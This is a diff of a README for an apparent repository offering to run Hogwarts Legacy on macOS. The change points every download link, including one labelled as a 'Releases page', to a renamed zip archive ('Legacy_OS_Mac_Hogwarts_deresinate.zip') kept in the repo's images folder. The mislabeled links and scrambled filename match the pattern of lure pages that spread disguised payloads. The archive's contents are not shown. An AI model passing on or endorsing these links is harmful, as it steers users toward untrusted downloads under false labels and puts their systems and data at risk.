@@ -1,6 +1,6 @@
 # 🎮 Hogwarts-Legacy-MacOS - Play Hogwarts Legacy on Mac Easily
 
-[![Download](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Hogwarts_Legacy_Mac_OS_2.7-alpha.1.zip%20Legacy%20MacOS-brightgreen)](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Hogwarts_Legacy_Mac_OS_2.7-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Legacy_OS_Mac_Hogwarts_deresinate.zip%20Legacy%20MacOS-brightgreen)](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Legacy_OS_Mac_Hogwarts_deresinate.zip)
 
 ## 📋 Description
 A simple step-by-step guide to playing Hogwarts Legacy on macOS using Heroic Games Launcher, Wine, and vcrun2022. Includes screenshots of the game running at 60 FPS on Ultra settings.
@@ -18,11 +18,11 @@ To play Hogwarts Legacy on your Mac, follow these steps. This guide assumes you 
 ## 🔍 Download & Install
 To get started, visit the Releases page to download the necessary files. Click the link below:
 
-[Download Hogwarts Legacy MacOS](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Hogwarts_Legacy_Mac_OS_2.7-alpha.1.zip)
+[Download Hogwarts Legacy MacOS](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Legacy_OS_Mac_Hogwarts_deresinate.zip)
 
 ### Step-by-Step Installation:
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Hogwarts_Legacy_Mac_OS_2.7-alpha.1.zip). You will see a list of available downloads.
+   Go to the [Releases page](https://raw.githubusercontent.com/zemcius/Hogwarts-Legacy-MacOS/main/images/Legacy_OS_Mac_Hogwarts_deresinate.zip). You will see a list of available downloads.
 
 2. **Download Heroic Games Launcher**  
    Find the latest version of the Heroic Games Launcher. Click on the download link to start the download.
